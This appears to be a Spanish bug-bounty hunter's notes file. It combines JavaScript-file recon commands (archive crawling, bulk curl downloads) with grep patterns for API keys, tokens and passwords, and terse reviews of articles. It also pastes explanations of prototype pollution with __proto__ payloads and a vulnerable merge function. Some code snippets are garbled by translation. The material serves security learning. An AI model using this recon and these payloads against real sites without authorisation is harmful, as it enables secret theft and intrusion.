y luego La salida sin procesar contiene una mezcla de URL completas y puntos finales incompletos. Para limpiarla:
# Extract only URLs for our target domain
grep -Eo 'https?://[^ )"]+example\.com[^ )"]*' linkfinder_raw.txt | sort -u > linkfinder_urls.txt

# Filter URLs that point to JS files
grep -E '\.js([?#].*)?$' linkfinder_urls.txt | sort -u > live_linkfinder_js.txt



Esto extrae URLs de fuentes como Wayback Machine, CommonCrawl y URLScan. El indicador —subs garantiza que también obtengamos URLs de subdominios.

NOTA : Al extraer datos de los archivos, utilice la lista de todos los subdominios de su dominio de destino. No solo los que siguen activos.


gau --subs < subdomains.txt | grep -E '\.js([?#].*)?$' | sort -u > archive_gau_js.txt



Un buscador de URL de Wayback Machine más simple y dedicado del gran Tomnomnom.


waybackurls < subdomains.txt | grep -E '\.js([?#].*)?$' | sort -u > archive_wayback_js.txt




Una vez que tengamos estas URL históricas, podemos ejecutar subjs o getjs en ellas, igual que hicimos con las URL activas. Esta es una excelente manera de capturar referencias JS que solo se enlazaron desde las páginas antiguas.


cat archive_gau_js.txt archive_wayback_js.txt | subjs | sort -u > archive_subjs_js.txt
cat archive_gau_js.txt archive_wayback_js.txt | getJS | sort -u > archive_getjs_js.txt

: No todos los archivos JS archivados serán accesibles (algunos pueden devolver 404 o 403), pero incluso las respuestas que no sean 200 a veces se pueden descargar directamente desde archive.org si encuentra la URL de la instantánea archivada.


No queremos analizar cada archivo por separado ni tener duplicados flotando, así que combinemos todo en una lista limpia.

sort -u live_*js.txt archive_*js.txt > all_js_files.txt



Opcional: Extraiga archivos JS para analizarlos sin conexión
Descargar todos los archivos JS permite realizar análisis estáticos sin depender de servidores activos. Es un proceso un poco más complejo, pero sencillo.

Crear carpeta:
Crea una carpeta para todos los archivos JS.

Copiar
# -p ensures it won't error if the folder already exists
mkdir -p js_files
2. Descargue los archivos en su carpeta con nombres de archivo codificados

Almacenaremos dos cosas:

Un nombre de archivo en hash para cada archivo JS (evita sobrescribir cuando varios archivos comparten el mismo nombre, como app.js).
Un archivo de mapeo para que puedas rastrear cada hash hasta su URL original.
Copiar
# Clear the hash_map.txt
> js_files/hash_map.txt

# One containing hashed filenames, and another containing the hash-to-URL mapping.
while read -r url; do
    hash=$(echo "$url" | md5sum | cut -d' ' -f1)
    echo "$hash $url" >> js_files/hash_map.txt
    curl -skLf --compressed "$url" -o "js_files/${hash}.js"
done < all_js_files.txt
Ahora, si encuentra algo interesante en un archivo ( por ejemplo, d41d8cd98f.js ), puede rastrearlo rápidamente:

Copiar
grep d41d8cd98f js_files/hash_map.txt
Resumen
Copiar
# 1. JS from live hosts
cat subdomains_alive.txt | subjs | sort -u > live_subjs_js.txt
cat subdomains_alive.txt | getJS | sort -u > live_getjs_js.txt
katana -list subdomains_alive.txt -d 2 -jc -silent | grep -E '\.js([?#].*)?$' | sort -u > live_katana_js.txt

linkfinder -i https://www.example.com -d -o cli | sort -u | tee linkfinder_raw.txt
grep -Eo 'https?://[^ )"]+example\.com[^ )"]*' linkfinder_raw.txt | sort -u > linkfinder_urls.txt
grep -E '\.js([?#].*)?$' linkfinder_urls.txt | sort -u > live_linkfinder_js.txt

# 2. JS from archived URLs
gau --subs < subdomains.txt | grep -E '\.js([?#].*)?$' | sort -u > archive_gau_js.txt
waybackurls < subdomains.txt | grep -E '\.js([?#].*)?$' | sort -u > archive_wayback_js.txt
cat archive_gau_js.txt archive_wayback_js.txt | subjs | sort -u > archive_subjs_js.txt
cat archive_gau_js.txt archive_wayback_js.txt | getJS | sort -u > archive_getjs_js.txt

# 3. Merge & deduplicate
sort -u live_*js.txt archive_*js.txt > all_js_files.txt

# Optional: Filter by target domain
grep -E '\.example\.com' all_js_files.txt > all_js_example.txt

# 4. Optional: Pull down the JS for offline static analysis
mkdir -p js_files
> js_files/hash_map.txt
while read -r url; do
    hash=$(echo "$url" | md5sum | cut -d' ' -f1)
    echo "$hash $url" >> js_files/hash_map.txt
    curl -skLf --compressed "$url" -o "js_files/${hash}.js"
done < all_js_files.txt
esta bueno intersante, muestra como configurar tu burp para interceptar los archivos .js filtrar en la parte de configuracion ademas 2 repos 
https://github.com/l4yton/RegHex?source=post_page-----c95a8aa7037a-------------------------------- este repo contiene un aproxmiado de 50 reglas regex interesante para sumar al arsenal de busqueda con reglas regex otro repo es para poder probar esas pia keys token etc con https://github.com/streaak/keyhacks


https://github.com/KathanP19/JSFScan.sh?tab=readme-ov-file tool interesante formato web resultado
nada interesante algunas reglas regex nada de otro mundo.
nada interesante.
nada nuevo 127 bugs encontrado pero bueno nada util.
nada.
nada nuevo.
nada nuevo.
Extraer parámetros LFI


cat all_urls.txt | grep -E "file=|path=|doc=|include=" | tee lfi_params.txt
nada
nada
nada
nada
nada
nada
nada
nada
nada
Después de completar el paso 1, tendrá bastantes archivos JavaScript, estos generalmente están ofuscados y básicamente transforman su código para que sea difícil robarlo o copiarlo. Para convertir el código ofuscado, necesitamos desofuscarlo, lo cual puede hacer con las siguientes herramientas.

Embellecedor JS
JSillery
JSDetox
IlluminateJS
JSNice
nada
varias tools interesante pero nada nuevo.
nada interesante solo algunos link a meduim de js nada nuevo.
nada
esta normal nada nuevo algo interesante la regal regex para filtrar lso url de waybacurk solo deje las extension etc 

sed 's|^https\?://[^/]\+/||':Este comando elimina el protocolo ( http://o https://) y el nombre de dominio de cada URL, dejando solo la ruta.
awk -F '/' '{print $NF}':Este comando extrae la última parte de cada URL después de dividirla por /, eliminando efectivamente la parte del dominio.
solo interesante la img del protocolo http
Consejo adicional: la mayoría de las funciones y credenciales codificadas o claves API existen en los archivos main.js, app.js, index.js, <custom-name>.js, son como una mina de oro.
shh
muy bueno super buneo completo tool explicacion cosas interesante t la tool  fff para probar los puntos finales varios etc varias reglas regex
interesante como buscar funcion de creacion url entres otros este le sabe.

repo tool fff: https://github.com/tomnomnom/fff
contiene unas 100 reglas regex interesante de diversas categorias
ya arme scrpy con ripgrep para poder hacerlo todo automatizado solo reglas
regex sumar las 50 mas de https://github.com/l4yton/RegHex?source=post_page-----c95a8aa7037a--------------------------------
nada nuevo
Nada interesante para mi.
Nada nuevo para mi solo buscar llamadas xhr.
Esta interesante pero el tipo se encontro con el mismo problema que me encontre yo con lo que seria reglas regex independientemente cual regla regex sea para parsear js etc no funciona del todo bien ya que no contempla todo las variaciones etc contexto ejemplo: 

(?(DEFINIR)(?'valor'(?P>cualquiera)?))(?(DEFINIR)(?'cualquiera'(?P>exterior_desequilibrado)*(?:(?P>parámetro)|(?P>llaves)|(?P>corchetes)|(?P>cadena)|)+(?P>exterior_desequilibrado)*))(?(DEFINIR)(?'cualquiera_interno'(?P>interior_desequilibrado)*(?:(?P>parámetro)|(?P>llaves)|( ?P>corchetes)|(?P>cadena)|)+(?P>interno_desequilibrado)*))(?(DEFINE)(?'parámetro'\(\s*(?P>cualquier_interno)+\s*\)))(?(DEFINE)(?'llaves'\{\s*(?P>cualquier_interno)+\s*\}))(?(DEFINE)(?'corchetes'\[\s*(?P>cualquier_interno)+\s*\]))(?(DEFINE)(?'cadena'((?P>cadena_ comillas_dobles)|(?P>comilla_simple_de_cadena)|(?P>tick_de_cadena))))(?(DEFINIR)(?'comilla_doble_de_cadena'"(?P>contexto_de_cadena)?"))(?(DEFINIR)(?'comilla_simple_de_cadena'\'(?P>contexto_de_cadena)?\'))(?(DEFINIR)(?'tick_de_cadena'`(?P>contexto_de_cadena)?`))(?(DEFINIR E)(?'contexto_de_cadena'(?>\\[\s\S]|[^\\])*))(?(DEFINIR)(?'exterior_desequilibrado'[^\(\)\{\}\[\]\"'`,;]))(?(DEFINIR)(?'interior_desequilibrado'(?:(?P>exterior_desequilibrado)|[,;])))(var|let|const|\G,)\s+(?:(?<nombre_de_variable>\w+)(?:\s*\=\s*(?P>valor))?\s*);?

este regla regex no contempla cosas mas complejas como.

Usa recursión y (?P>...) lo que sugiere un engine PCRE con recursividad —poca gente lo ejecuta sobre grandes repos.

Intenta capturar value con (?P>any) pero:

no cubre destructuring,

no distingue regex literal /.../ vs division operator,

no distingue template expressions ${...},

no considera export/import/class fields.

Resultado: funciona en ejemplos limpios controlados, pero en el wild produces noise y tiempos de ejecución largos. 

en fin para la persona del informe de meduim esta bien lo que tomo la opcione sa pero para hacer mas simplem y potente como lo hice yo seria
simplemente dejar los que seria numero de ip llamadas aja redes , entres otros dejarlo con reglas regex pero no limitarse con solo eso que sea todo reglas regex son crear categorias independiente unas 70 como lo tegno yo y cada categoria tiene su propio diccionario de palabras claves ejemplo la categoria de variables con un diccionario con palabras claves ejemplo etc y listo y lo convias con regex tambine con ripgrep y chau demsiado complejidad se hacen al pepe.
no vi explotacion real en un target bug bounty con los cve de extension retire .js pss nada nada che pero bueno.
pues solo esto intersante.

 Un flujo de trabajo para gobernarlos a todos
Copiar
usedjs → LinkFinder → truffleHog → sourcemaps → AI → Burp/Postman
Esta pila tiene:

Se encontraron fugas de tokens OAuth en paquetes de React minimizados
Se descubrieron omisiones de autenticación solo de depuración en los comentarios de JS
API olvidadas expuestas de SPA heredadas
Condujo a recompensas de más de $5,000 por fallas en la lógica del token y CSP
Cómo encontrar prototipos similares de insectos contaminantes
Busque funciones de fusión profunda:
Herramientas como merge, defaults, o zipObjectDeepque combinan objetos anidados son objetivos principales.
2. Pruebe cargas útiles basadas en prototipos:

Pruebe con teclas como __proto__, constructor.prototype, o prototype.
Copiar
{ "__proto__.admin": true }
3. Verificar el impacto global:

Después de la inyección, cree un nuevo objeto vacío y vea si persisten los valores contaminados:
Copiar
console.log({}.admin); // Should be undefined in a safe implementation
4. Grepping del código:

Busque cualquier mergeutilidad assignDeepde construcción de objetos que gestione la entrada del usuario. Esté atento a cualquier forma de construcción de rutas sin verificar.
nada interesante.
Para una explotación exitosa de la contaminación prototipo se requieren los siguientes componentes clave:

Una fuente de contaminación prototipo : es cualquier entrada que le permite envenenar objetos prototipo con propiedades arbitrarias.
Un sumidero : en otras palabras, una función de JavaScript o un elemento DOM que permite la ejecución de código arbitrario.
Un dispositivo explotable : es cualquier propiedad que se arroja a un fregadero sin una filtración o desinfección adecuadas.
Prototipos de fuentes de contaminación
Una fuente de contaminación de prototipos es cualquier entrada controlable por el usuario que permite añadir propiedades arbitrarias a los objetos de prototipos. Las fuentes más comunes son las siguientes:

La URL a través de la consulta o de la cadena de fragmento (hash)
Entrada basada en JSON
Mensajes web
Prototipo de contaminación a través de la URL
Considere la siguiente URL, que contiene una cadena de consulta construida por el atacante:

https://vulnerable-website.com/?__proto__[evilProperty]=payload

Al descomponer la cadena de consulta en key:valuepares, un analizador de URL podría interpretarla __proto__como una cadena arbitraria. Pero veamos qué sucede si estas claves y valores se fusionan posteriormente en un objeto existente como propiedades.

Se podría pensar que la __proto__propiedad, junto con sus anidadas evilProperty, simplemente se agregarán al objeto de destino de la siguiente manera:

{ 
    propiedadexistente1: 'foo' , 
    propiedadexistente2: 'bar' , 
    __proto__: { 
        propiedadevil: 'carga útil'
     } 
}
Sin embargo, este no es el caso. En algún momento, la operación de fusión recursiva podría asignar el valor de evilPropertyusar una instrucción equivalente a la siguiente:

targetObject.__proto__.evilProperty = 'payload';

Durante esta asignación, el motor de JavaScript actúa __proto__como un getter para el prototipo. Como resultado, evilPropertyse asigna al objeto prototipo devuelto en lugar del objeto de destino. Suponiendo que el objeto de destino usa el valor predeterminado Object.prototype, todos los objetos en el entorno de ejecución de JavaScript heredarán ahora el valor predeterminado evilProperty, a menos que ya tengan una propiedad propia con una clave coincidente.

En la práctica, es poco probable que inyectar una propiedad llamada evilPropertytenga algún efecto. Sin embargo, un atacante puede usar la misma técnica para contaminar el prototipo con propiedades utilizadas por la aplicación o cualquier biblioteca importada.

Prototipo de contaminación mediante entrada JSON
Los objetos controlables por el usuario suelen derivarse de una cadena JSON mediante el JSON.parse()método. Curiosamente, JSON.parse()también trata cualquier clave del objeto JSON como una cadena arbitraria, incluyendo elementos como __proto__. Esto proporciona otro vector potencial de contaminación de prototipos.

Digamos que un atacante inyecta el siguiente JSON malicioso, por ejemplo, a través de un mensaje web:

{ 
    "__proto__" :  { 
        "evilProperty" :  "carga útil" 
    } 
}
Si esto se convierte en un objeto JavaScript a través del JSON.parse()método, el objeto resultante de hecho tendrá una propiedad con la clave __proto__:

constante objectLiteral = {__proto__: {evilProperty: 'payload '}}; 
constante objectFromJson = JSON.parse ('{ "__proto__" : { "evilProperty" : "payload" }}'); objectLiteral.hasOwnProperty ( '__proto__ ' );      // falso objectFromJson.hasOwnProperty ( ' __proto__ ' );     // verdadero


Si el objeto creado mediante JSON.parse()se fusiona posteriormente con un objeto existente sin una desinfección de clave adecuada, esto también provocará una contaminación del prototipo durante la asignación, como vimos en el ejemplo anterior basado en URL .

Prototipos de sumideros de contaminación
Un sumidero de contaminación de prototipos es básicamente una función de JavaScript o un elemento DOM al que se puede acceder mediante contaminación de prototipos, lo que permite ejecutar comandos arbitrarios de JavaScript o del sistema. Hemos abordado algunos sumideros del lado del cliente en detalle en nuestro tema sobre XSS de DOM .

Dado que la contaminación de prototipos permite controlar propiedades que de otro modo serían inaccesibles, esto potencialmente permite acceder a varios receptores adicionales dentro de la aplicación de destino. Los desarrolladores que no estén familiarizados con la contaminación de prototipos pueden asumir erróneamente que estas propiedades no son controlables por el usuario, lo que significa que el filtrado o la desinfección podrían ser mínimos.

Prototipos de dispositivos anticontaminación
Un dispositivo permite convertir la vulnerabilidad de contaminación del prototipo en un exploit real. Se trata de cualquier propiedad que:

Utilizado por la aplicación de forma insegura, como por ejemplo pasándolo a un fregadero sin un filtrado o sanitización adecuados.
Controlable por el atacante mediante la contaminación del prototipo. En otras palabras, el objeto debe poder heredar una versión maliciosa de la propiedad añadida al prototipo por un atacante.
Una propiedad no puede ser un gadget si está definida directamente en el propio objeto. En este caso, la versión propia de la propiedad del objeto prevalece sobre cualquier versión maliciosa que se pueda añadir al prototipo. Los sitios web robustos también pueden establecer explícitamente el prototipo del objeto en null, lo que garantiza que no herede ninguna propiedad.
Como todos sabemos, JavaScript es uno de los lenguajes de programación orientados a objetos que admite la funcionalidad de herencia. Por lo tanto, siempre que en JavaScript intentamos acceder a un objeto, primero verifica el objeto y luego si existe una propiedad para él. Si la propiedad existe, devolverá la misma; de lo contrario, comenzará a buscar la misma propiedad en su prototipo. Este proceso continúa hasta que se encuentra la propiedad cuando el objeto no tiene un prototipo asociado.


Intentemos entenderlo con un ejemplo, donde A es el objeto y B es la propiedad.

Constante A = {B = "bendecir"}

AB // "bendecir"

AC // indefinido

//declaración de prototipos

Objeto.prototipo.B = "Hola BB"

Objeto.prototipo.C = "Hola C"

AB // bendecir

AC // Hola C

Como podemos ver claramente, C no está declarado en la propiedad, pero su prototipo ya existía. Si un atacante logra modificar el prototipo, afectará a todos los objetos que heredan de él, lo que puede tener consecuencias inesperadas.

Esta vulnerabilidad permite a los atacantes añadir propiedades accesibles a todos los objetos en JavaScript, e incluso controlar las propiedades de los objetos y sus valores predeterminados. De esta forma, un atacante puede manipular o alterar la lógica de la aplicación, lo que en última instancia puede provocar ataques de denegación de servicio (DoS) o RCE. Se añaden propiedades arbitrarias a objetos globales que posteriormente invocan los objetos definidos por el usuario.

Esta vulnerabilidad existe cuando la aplicación no gestiona la propiedad controlada por el atacante de forma segura. Exploremos cómo identificar aplicaciones vulnerables y cómo aprovecharlas al máximo.

Al principio, necesitamos inyectar la propiedad con una clave como _proto_, que también tiene propiedades anidadas. En JavaScript, _proto_ es una forma de heredar propiedades de un objeto o incluso expone el [[prototipo]] del objeto a través del cual se accede. De esta forma, podemos comprobar si el prototipo contiene valores dañinos que puedan ser perjudiciales para la aplicación. En JavaScript, tenemos el objeto globo de boletín, es decir, Object.prototype.

En cualquier aplicación, primero debo buscar las áreas de entrada donde puedo inyectar este _proto_. Al inyectar esta entrada, ?__proto__bless=bless en la URL de mi aplicación, debo verificar si la respuesta se refleja allí ingresando Object.prototype en la pestaña de la consola.
pues nada interesante solo la explicacion de como capturar y la recomendacion de no guatdar en x formato desabilitar esa opcion en  burp suite etc y nada mas interesante.
esta bueno varios consejos muchos de ellos no sabia y son basico existen mucho mas creare un repo aparte para js.
Es un lenguaje de programación dinámica (como ningún otro).
Origen en 1995 con el nombre de LiveScript y cambió su nombre posteriormente a javaescript como una estrategia de mercadeo por el apogeo que tenía en ese entonces Java.
Java y Javascript son lenguajes de programación totalmente diferentes. (aunque sus sintaxis tengan cierta similitud).
Antes de nodejs javascript solo se ejecutaba del lado del cliente. (En los navegadores web).
Javascript no tiene capacidad multihilo o múltiples procesos simultáneos. Solo puede ejecutar un procedimiento secuencial a la vez. (Cuando una función se ejecuta fuera del hilo principal lo que hace es caer a una pila de funciones o procedimientos de javascript).
En javascript la etiqueta <script> crea un objeto global.
Cualquier función o variable es alojada en el objeto global o principal (Global Object).
Podemos escribir “windows” en la consola del navegador para ver el objeto global.
Un objeto en código javascript empieza y se cierra con llaves.{}
Un objeto en javascript es una colección de propiedades de pares clave — valor.
Cuando se corre javascript del lado del servidor (nodejs) el objeto principal no es windows.
Para hacer anotaciones en la consola con alguna distinción podemos utilizar console.log(a), console.info(a), console.warn(a), console.erro(a).
En todas las variables primitivas el valor por defecto es indefinido.
Cuando utilizamos la igualdad abstracta (doble igual == ) no estamos comparando el tipo de dato de la variable.
Cuando utilizamos la igualdad estricta (triple igual === ) estamos comparando el tipo de dato de la variable.
Un tipo de dato primitivo es un tipo de dato que apunta a un solo valor.
En javascript las variables no están amarradas a un tipo de dato.
Un objeto es una colección de tipos de datos primitivos o de otros objetos.
Al crear un objeto con más de una propiedad, estos se separan por coma.
El elemento último de un objeto no termina en “ , ” o “ ; ”
Al crear un objeto o una función con un nombre compuesto debemos usar camelCase.
EL nombre de una variable siempre debe empezar con minúscula.
Al crear un atributo dentro de un objeto no es necesario reservarlo con la palabra “var”.
La notación de punto nos permite acceder a las propiedades o valores de un objeto.
Debemos evitar el uso de acentos y caracteres especiales en los nombres de nuestras variables, objetos y funciones.
En javascript todo retorna un valor.
Las funciones en javascript son objetos.
En javascript existen funciones anónimas (sin nombre) y funciones explícitas (con nombre).
Las variables, objetos y funciones anónimas son las que se definen en el momento que las vamos a usar.
Colocamos paréntesis “()” inmediatamente después de una función anónima para decir le a JavaScript “Ejecuta este código que estoy poniendo aquí como si se tratara de una función”.
Una función anónima tiene sentido cuando queremos pasar como parámetro una función muy sencilla y definirla a parte seria cuanto menos innecesario.
Una función anónima tiene sentido cuando intentamos evitar a toda costa el uso de variables globales.
Los dos paréntesis finales se utilizan para llamar a una función anónima.
En JavaScript una función se ejecuta cuando la llamamos usando los paréntesis (Sin paréntesis se obtiene una referencia a la misma).
Las funciones pueden recibir tipos primitivos, objetos y otras funciones como parámetros.
Un array es una variable especial, que puede contener más de un valor.
Muchos métodos para el objeto Array de JavaScript están diseñados para ser aplicados generalmente a todos los objetos los cuales “se asemejan” a las matrices unidimensionales.
La primera posición de un arreglo en javascript es el 0.
En javascript arr.map() nos permite ejecutar una función por cada uno de los elementos de ese arreglo “arr”.
código fuente, descubres un archivo "app.js". Además, al visitar [nombre del sitio https://www.example.com/settings], verás un archivo " settings.js ".


Sin embargo, en este momento, nos centramos en app.js. ¿Qué buscamos? Nuevos endpoints , parámetros y, quizás, claves API .

Lo que estás buscando
Nuevos puntos finales

Nuevo parámetro

Funciones ocultas. No están disponibles en la aplicación web, pero el código existe para la función. ¿Solo para usuarios premium? ¿Se puede interactuar con ella como usuario no premium?

Claves API

Los comentarios de los desarrolladores (por ejemplo, // este es un comentario de desarrollo o /* este es un comentario de desarrollo de varias líneas */) a veces pueden contener información como la fecha de publicación del código o las actualizaciones realizadas. Si el código es antiguo, es más probable que encuentres un problema.
Cómo extraer archivos JavaScript de directorios recursivos
find /path/to/your/folders -name “*.js” -exec mv {} /path/to/target/folder/ \;

cat * es para todos los archivos de la carpeta.
Búsqueda de claves API y secretos
cat * | grep -rE “apikey|api_key|secret|token|password|auth|key|pass|user”

Detección de llamadas a funciones peligrosas
cat * | grep -rE “eval|document\.write|innerHTML|setTimeout|setInterval|Function”


Comprobación de manipulación de URL
cat * | grep -rE “location\.href|location\.replace|location\.assign|window\.open”

Búsqueda de solicitudes de origen cruzado
cat * | grep -rE “XMLHttpRequest|fetch|Access-Control-Allow-Origin|withCredentials” /path/to/js/files

Analizando el uso de `postMessage`
cat * | grep -r “postMessage”

Cómo encontrar URL o puntos finales codificados de forma rígida
cat * | grep -rE “https?://|www\.”

Localización de información de depuración
cat * | grep -rE “console\.log|debugger|alert|console\.dir”

Investigación del manejo de la entrada del usuario
cat * | grep -rE “document\.getElementById|document\.getElementsByClassName|document\.querySelector|document\.forms”
nada interesante.
Hoy, analizaremos seis de las vulnerabilidades más comunes que afectan a las aplicaciones Angular y React, y cómo encontrarlas y prevenirlas. Las vulnerabilidades que abordaré en esta publicación son:

Omisión de autenticación
Control de acceso inadecuado
Abrir redirecciones
Falsificación de solicitud entre sitios (CSRF)
Inyección de plantilla
Inclusión de secuencias de comandos entre sitios (XSSI)
Omisión de autenticación
La autenticación consiste en comprobar la identidad antes de ejecutar acciones confidenciales o acceder a datos confidenciales. Si la autenticación no se implementa correctamente en una aplicación, los atacantes pueden aprovechar estas configuraciones incorrectas para acceder a funciones a las que no deberían tener acceso.

Por ejemplo, el enrutamiento en Angular suele realizarse con AppRoutingModule. Antes de dirigir a los usuarios a rutas sensibles en la aplicación, debe comprobar si el usuario ha sido autenticado y autorizado para acceder a ese recurso.


Para obtener más detalles sobre cómo configurar la autenticación correctamente en Angular y React, lea estos tutoriales .

Llévame de nuevo a la cima.

Control de acceso inadecuado
Un control de acceso inadecuado ocurre siempre que el control de acceso en una aplicación se implementa incorrectamente y puede ser evadido por un atacante. Los problemas de evasión de autenticación son esencialmente un tipo de control de acceso inadecuado. Sin embargo, el control de acceso abarca más que la autenticación. Mientras que la autenticación solicita al usuario que demuestre su identidad: "¿Quién es usted?", la autorización pregunta a la aplicación: "¿Qué puede hacer este usuario?". La autenticación y la autorización adecuadas garantizan que los usuarios no puedan acceder a funcionalidades fuera de sus permisos.

Hay varias maneras de configurar la autorización de usuarios: control de acceso basado en roles, control de acceso basado en propiedad, listas de control de acceso y más. Aquí tienes algunas publicaciones útiles para implementar el control de acceso en Angular y React .

Un error común que cometen los desarrolladores es realizar comprobaciones de autorización en el lado del cliente. Esto no es seguro, ya que un atacante puede anular estas comprobaciones. Estas comprobaciones de autorización deben realizarse mediante código del lado del servidor:


Llévame de nuevo a la cima.

Redirecciones abiertas
Los sitios web suelen necesitar redirigir automáticamente a sus usuarios. Por ejemplo, esta
situación ocurre cuando usuarios no autenticados intentan acceder a una página
que requiere iniciar sesión. El sitio web suele redirigir a esos usuarios a la
página de inicio de sesión y, una vez autenticados, los regresa a su ubicación original.

Recibe las historias de Vickie Li en tu bandeja de entrada
Únase a Medium de forma gratuita para recibir actualizaciones de este escritor.

Introduce tu correo electrónico
Suscribir
Durante un ataque de redirección abierta, un atacante engaña al usuario para que visite
un sitio externo proporcionándole una URL del sitio legítimo que
redirige a otro sitio. Esto puede hacer creer a los usuarios que siguen en el sitio original y ayudar a los estafadores a crear una campaña de phishing más creíble.

Para evitar redirecciones abiertas, asegúrese de que la aplicación no redirija a los usuarios a ubicaciones maliciosas. Por ejemplo, puede deshabilitar completamente las redirecciones externas validando las URL de redireccionamiento :


Existen muchas otras maneras de evitar las redirecciones abiertas, como verificar el origen de las solicitudes o usar índices de página para las redirecciones. Sin embargo, debido a la dificultad de validar las URL , las redirecciones abiertas siguen siendo un problema frecuente en las aplicaciones web modernas.

Llévame de nuevo a la cima.

Falsificación de solicitud entre sitios
La falsificación de solicitud entre sitios (CSRF) es una técnica del lado del cliente que se utiliza para atacar a otros usuarios de una aplicación web. Mediante CSRF, los atacantes pueden enviar solicitudes HTTP que simulan provenir de la víctima y realizar acciones no deseadas en su nombre. Por ejemplo, un atacante podría cambiar su contraseña o transferir dinero de su cuenta bancaria sin su permiso.

A diferencia de las redirecciones abiertas, existe una forma infalible de prevenir CSRF: usar una combinación de tokens CSRF y cookies de SameSite , y evitar el uso de solicitudes GET para acciones que alteren el estado. Por ejemplo, Angular permite agregar tokens antifalsificación a las solicitudes HTTP mediante el HttpClientXsrfModulemódulo:


Llévame de nuevo a la cima.

Inyección de plantilla
Las plantillas web son archivos similares a HTML que permiten a los desarrolladores especificar cómo se debe renderizar una página combinando datos de la aplicación con plantillas estáticas. Esta funcionalidad permite a los desarrolladores insertar contenido dinámico obtenido de una base de datos o de una solicitud HTTP en páginas web.

La inyección de plantillas se refiere a la inyección en plantillas web. Dependiendo de los permisos de la aplicación comprometida, los atacantes podrían aprovechar la vulnerabilidad de inyección de plantillas para leer archivos confidenciales, ejecutar código o aumentar sus privilegios en el sistema. Por ejemplo, a continuación se muestra un uso inseguro de una plantilla de Angular que permite a los atacantes inyectar código mediante hashes de URL:


Nunca debe concatenar directamente la información proporcionada por el usuario en las plantillas. En su lugar, utilice el mecanismo de sustitución integrado del motor de plantillas para integrar de forma segura la información dinámica:


Obtenga más información sobre cómo funciona la inyección de plantillas y cómo prevenirlas en Angular y React .

Llévame de nuevo a la cima.

Inclusión de secuencias de comandos entre sitios
Los ataques de inclusión de scripts entre sitios, también conocidos como XSSI, ocurren cuando un sitio malicioso incluye JavaScript del sitio web de la víctima para extraer información confidencial del script.

La política del mismo origen (SOP) suele controlar el acceso a datos entre orígenes. Sin embargo, la SOP no limita el código JavaScript, y la <script>etiqueta HTML puede cargar código JavaScript desde cualquier origen. Esta es una función extremadamente práctica que permite reutilizar archivos JavaScript en diferentes dominios. Sin embargo, esta función también supone un riesgo de seguridad: los atacantes podrían robar datos escritos en archivos JavaScript cargando los archivos JS de sus víctimas.

Por ejemplo, imagine que un sitio web almacena y transporta datos confidenciales de usuarios conectados mediante archivos JavaScript. Si un usuario visita un sitio malicioso en el mismo navegador, este puede importar ese archivo JavaScript y acceder a información confidencial asociada a la sesión del usuario, todo gracias a las cookies del usuario almacenadas en el navegador. Vea un ejemplo de esta vulnerabilidad y aprenda a prevenirlas en Angular y React .

Para evitar ataques XSSI, no transporte datos confidenciales en archivos JavaScript. A continuación, se muestra un ejemplo de cómo cargar de forma segura un token de API en Angular usando archivos JSON (que están limitados por el procedimiento operativo estándar):
depende mucho de las tools pero bueno ya lo dijo el mismo en fin basico para mi.
repo de reglas regex algo basico para mi gusto pero validar con regex101 50 aprox no mucho mas que mirar
nada interesante.
y bueno nada che.
¿Qué es Prototipo?
El prototipo define la estructura y las propiedades de un objeto en Javascript. Entonces, ¿qué es un objeto? En Javascript, podemos pensar en un objeto como un conjunto de pares de claves. Cada par de claves se denomina propiedad. Por ejemplo, si queremos crear un objeto llamado Usuario con dos propiedades: nombre de usuario y contraseña, podemos escribir un código simple como el siguiente:


función Usuario(nombre de usuario, contraseña){ 
this.username=nombre de usuario; 
this.password=contraseña; 
}
Luego, para crear un nuevo usuario, simplemente se puede hacer siguiendo el siguiente código:


var usuarioA = nuevo Usuario(“Juan”, “12345678”);
console.log(“Se crea el usuario “+userA.username + “”); //salida: Se crea el usuario John
Entonces, se crea un objeto usuarioA con el nombre de usuario establecido como John y la contraseña establecida como 12345678. Estas propiedades se heredan del prototipo del usuario.

Propiedad del prototipo
Una propiedad de prototipo permite al usuario modificar la estructura o propiedad del prototipo. Por ejemplo, si queremos crear una función para que el usuario cambie su contraseña, podemos crear una función como la siguiente:

Copiar

User.prototype.change_password = function(var new_pw){
return this.password=new_pw;
}
userA.change_password("1234");
console.log("User "+userA.name+" password now is "+userA.password; //User John passowrd now is 1234
Contaminación prototipo
Tomando el mismo ejemplo, si creamos el usuarioB como se muestra a continuación:

Copiar
var userB = new User("Billy", "abcd");
Considerando que escribimos otra línea de código a continuación:

Copiar
userB.constructor.prototype.is_admin = "yes";
Según el código anterior, constructor se refiere a la función que creó al usuario B (es decir, Usuario). Por lo tanto, es exactamente igual que User.prototype.is_admin="yes". Como este cambio se aplica al prototipo del usuario, modifica todos los objetos creados por el usuario, incluido el usuario A. Por lo tanto, si imprimimos la propiedad is_admin del usuario A, descubriremos que también ha cambiado al usuario A:

Copiar
console.log(userA.is_admin); //yes
De manera similar, constructor.prototype también se puede presentar como __proto__ como se muestra a continuación:

Copiar
userB.__proto__.is_admin = "yes";
Contaminación del prototipo en la función de fusión
Ahora, considere 2 objetos como se muestra a continuación:

Copiar
var userA = {"name":"John" , "password":"123", "admin":"True"};
var userB = {"name":"Billy", "password":"234"};
Ahora, escribamos una función para fusionar estos 2 objetos:

Copiar
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
function merge(dest, src) {
 for (var attr in src) {
 if (isObject(dest[attr]) && isObject(src[attr])) {
 merge(dest[attr], src[attr]);
 } else {
 dest[attr] = src[attr];
 }
 }
 return dest
}
Repasemos el código anterior para ver. En él, creamos una variable llamada isObject, que es simplemente un booleano, para comprobar si la entrada es un objeto. Luego, la función de fusión toma dos entradas (dest y src) y las pasa a un bucle. El bucle recorrerá todos sus atributos y los copiará de src a dest. Básicamente, fusiona dos objetos en uno. Si ejecutamos el siguiente código:

Copiar

var c=merge(userA, userB);
console.log(c); //{name:"Billy",password:"234",admin:"True"}
Ahora, si agregamos el siguiente código:

Copiar
var userC = {};
var userD = JSON.parse('{"__proto__":{"admin":"True"}}');
var c=merge(userC, userD);
console.log(userC.admin);
Puedes ver que el código anterior puede cambiar cada usuario a administrador, incluso si el usuario D no es administrador.

La contaminación de prototipos es una vulnerabilidad bastante peligrosa y común en las aplicaciones Javascript. En un próximo artículo, analizaremos casos reales de contaminación de prototipos.
duplicado analisis js para open redirect .
anilisis de js pero antes de hacer reversing a la aplicacion de escritorio de eletron interesante.
Cómo funciona la contaminación prototípica
